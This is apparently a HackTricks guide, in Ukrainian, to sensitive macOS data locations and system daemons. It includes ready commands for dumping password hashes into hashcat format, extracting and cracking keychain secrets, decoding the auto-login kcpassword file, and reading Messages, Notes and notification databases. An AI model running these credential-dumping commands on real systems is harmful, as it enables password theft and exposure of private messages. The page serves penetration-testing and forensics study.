# Чутливі місця macOS та цікаві демони

{% hint style="success" %}
Вивчайте та практикуйте взлом AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Навчання AWS Red Team Expert (ARTE) HackTricks**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте взлом GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Навчання GCP Red Team Expert (GRTE) HackTricks**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.

</details>
{% endhint %}

## Паролі

### Тіньові паролі

Тіньовий пароль зберігається разом із конфігурацією користувача в plist-файлах, розташованих в **`/var/db/dslocal/nodes/Default/users/`**.\
Наступний одностроковий вираз може бути використаний для виведення **всієї інформації про користувачів** (включаючи інформацію про хеш): 

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Сценарії, подібні до цього**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) або [**цього**](https://github.com/octomagon/davegrohl.git) можуть бути використані для перетворення хешу у формат **hashcat**.

Альтернативний однорядковий інструмент, який виведе дані облікових записів всіх неслужбових облікових записів у форматі hashcat `-m 7100` (macOS PBKDF2-SHA512):

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
### Витік ключів

Зверніть увагу, що при використанні бінарного файлу безпеки для **витягування розшифрованих паролів**, користувачеві буде запропоновано декілька запитань для дозволу цієї операції.
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
За цим коментарем [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) здається, що ці інструменти більше не працюють в Big Sur.
{% endhint %}

### Огляд Keychaindump

Інструмент під назвою **keychaindump** був розроблений для вилучення паролів з ключниць macOS, але він має обмеження на новіших версіях macOS, таких як Big Sur, як це вказано в [обговоренні](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Використання **keychaindump** вимагає від зловмисника отримання доступу та підвищення привілеїв до **root**. Інструмент використовує той факт, що ключниця за замовчуванням розблоковується при вході користувача для зручності, що дозволяє програмам отримувати до неї доступ без необхідності повторного введення пароля користувача. Однак, якщо користувач вирішить блокувати свою ключницю після кожного використання, **keychaindump** стає неефективним.

**Keychaindump** працює, спрямовуючись на конкретний процес під назвою **securityd**, описаний Apple як демон для авторизації та криптографічних операцій, який є важливим для доступу до ключниці. Процес вилучення включає виявлення **Master Key**, похідного від пароля входу користувача. Цей ключ є важливим для читання файлу ключниці. Для знаходження **Master Key**, **keychaindump** сканує пам'ять купи **securityd**, використовуючи команду `vmmap`, шукаючи потенційні ключі в областях, позначених як `MALLOC_TINY`. Для перевірки цих місць пам'яті використовується наступна команда:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Після ідентифікації потенційних головних ключів, **keychaindump** шукає через купи певний шаблон (`0x0000000000000018`), що вказує на кандидата на головний ключ. Для використання цього ключа потрібні додаткові кроки, включаючи деобфускацію, як описано в вихідному коді **keychaindump**. Аналітики, які зосереджуються на цій області, повинні зауважити, що важливі дані для розшифрування keychain зберігаються в пам'яті процесу **securityd**. Приклад команди для запуску **keychaindump**:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) може бути використаний для вилучення наступних типів інформації з ключового ланцюжка OSX у форензично обґрунтований спосіб:

* Хешований пароль ключового ланцюжка, придатний для взлому за допомогою [hashcat](https://hashcat.net/hashcat/) або [John the Ripper](https://www.openwall.com/john/)
* Інтернет-паролі
* Загальні паролі
* Приватні ключі
* Публічні ключі
* X509-сертифікати
* Безпечні нотатки
* Паролі Appleshare

За наявності паролю розблокування ключового ланцюжка, майстер-ключа, отриманого за допомогою [volafox](https://github.com/n0fate/volafox) або [volatility](https://github.com/volatilityfoundation/volatility), або файлу розблокування, такого як SystemKey, Chainbreaker також надасть паролі у відкритому вигляді.

Без одного з цих методів розблокування ключового ланцюжка Chainbreaker відобразить усю іншу доступну інформацію.

#### **Вивантаження ключів ключового ланцюжка**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Витягнути ключі зі сховища (з паролями) за допомогою SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Витягнення ключів keychain (з паролями) та взлам хешу**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Витягнення ключів keychain (з паролями) за допомогою дампу пам'яті**

[Виконайте ці кроки](../#dumping-memory-with-osxpmem), щоб виконати **дамп пам'яті**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Витягнення ключів keychain (з паролями) за допомогою пароля користувача**

Якщо ви знаєте пароль користувача, ви можете використати його для **витягнення та розшифрування keychain, які належать користувачеві**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

Файл **kcpassword** - це файл, який містить **пароль для входу користувача**, але лише у випадку, якщо власник системи **увімкнув автоматичний вхід**. Тому користувач буде автоматично увійти без запиту пароля (що не є дуже безпечним).

Пароль зберігається в файлі **`/etc/kcpassword`**, зашифрований з ключем **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Якщо пароль користувача довший за ключ, ключ буде повторно використаний.\
Це робить пароль досить легким для відновлення, наприклад, за допомогою скриптів, подібних до [**цього**](https://gist.github.com/opshope/32f65875d45215c3677d). 

## Цікава інформація в базах даних

### Повідомлення
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Сповіщення

Ви можете знайти дані про сповіщення в `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

Більшість цікавої інформації буде в **blob**. Тому вам потрібно буде **видобути** цей вміст і **перетворити** його в **людино-зрозумілий** формат або використати **`strings`**. Для доступу до нього ви можете виконати:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
### Примітки

Примітки користувачів можна знайти за шляхом `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

{% endcode %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
## Налаштування

У macOS налаштування програм розташовані в **`$HOME/Library/Preferences`**, а в iOS вони знаходяться в `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

У macOS інструмент командного рядка **`defaults`** може бути використаний для **зміни файлу налаштувань**.

**`/usr/sbin/cfprefsd`** використовує служби XPC `com.apple.cfprefsd.daemon` та `com.apple.cfprefsd.agent` і може бути викликаний для виконання дій, таких як зміна налаштувань.

## Системні сповіщення

### Сповіщення Darwin

Основний демон для сповіщень - **`/usr/sbin/notifyd`**. Для отримання сповіщень клієнти повинні зареєструватися через порт Mach `com.apple.system.notification_center` (перевірте їх за допомогою `sudo lsmp -p <pid notifyd>`). Демон налаштовується за допомогою файлу `/etc/notify.conf`.

Назви, що використовуються для сповіщень, є унікальними оберненими DNS-нотаціями, і коли сповіщення надсилається на одну з них, клієнти, які вказали, що можуть його обробити, отримають його.

Можливо вивести поточний статус (і побачити всі назви), надславши сигнал SIGUSR2 процесу notifyd та прочитавши згенерований файл: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Розподілений Центр Сповіщень

**Розподілений Центр Сповіщень** (Distributed Notification Center), головний бінарний файл якого розташований у **`/usr/sbin/distnoted`**, є ще одним способом надсилання сповіщень. Він використовує деякі служби XPC і виконує перевірку для підтвердження клієнтів.

### Сповіщення Apple Push (APN)

У цьому випадку додатки можуть реєструватися для **тем** (topics). Клієнт буде генерувати токен, звертаючись до серверів Apple через **`apsd`**.\
Потім провайдери також згенерують токен і матимуть змогу підключитися до серверів Apple для надсилання повідомлень клієнтам. Ці повідомлення будуть локально отримані **`apsd`**, який передасть сповіщення додатку, який його очікує.

Налаштування знаходяться у `/Library/Preferences/com.apple.apsd.plist`.

Є локальна база даних повідомлень, розташована в macOS у `/Library/Application\ Support/ApplePushService/aps.db` і в iOS у `/var/mobile/Library/ApplePushService`. Вона має 3 таблиці: `incoming_messages`, `outgoing_messages` та `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Також можна отримати інформацію про демона та з'єднання за допомогою:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Сповіщення користувача

Це сповіщення, які користувач повинен побачити на екрані:

* **`CFUserNotification`**: Це API надає можливість показати на екрані спливаюче вікно з повідомленням.
* **Дошка оголошень**: Це показується в iOS як банер, який зникає і буде збережений у Центрі сповіщень.
* **`NSUserNotificationCenter`**: Це дошка оголошень iOS в MacOS. База даних зі сповіщеннями знаходиться в `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`
